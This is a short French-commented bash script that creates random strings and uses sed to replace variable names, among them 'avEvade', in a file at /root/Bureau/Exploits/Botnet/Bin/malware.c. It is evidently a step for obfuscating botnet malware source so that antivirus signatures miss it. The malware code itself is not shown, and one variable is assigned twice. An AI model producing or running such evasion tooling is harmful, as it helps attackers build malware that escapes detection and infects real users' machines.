#!/bin/bash
echo ""
echo "[+] Modification des variables en cours"

random1=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random3=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random4=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random5=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random6=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random7=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random8=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random9=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random10=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random11=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random12=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random12=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)
random13=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 40 | head -n 1)

sed -i "s/"compt1"/"$random1"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"compt2"/"$random2"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"longu"/"$random3"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"position"/"$random4"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"avEvade"/"$random5"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"longueur2"/"$random6"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"code"/"$random7"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"num"/"$random8"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"var12"/"$random9"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"cpt"/"$random10"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"opt"/"$random11"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"MAX_OP"/"$random12"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c
sed -i "s/"TOO_MUCH_MEM"/"$random13"/g" /root/Bureau/Exploits/Botnet/Bin/malware.c

echo "[+] Fin de la modification des variables"
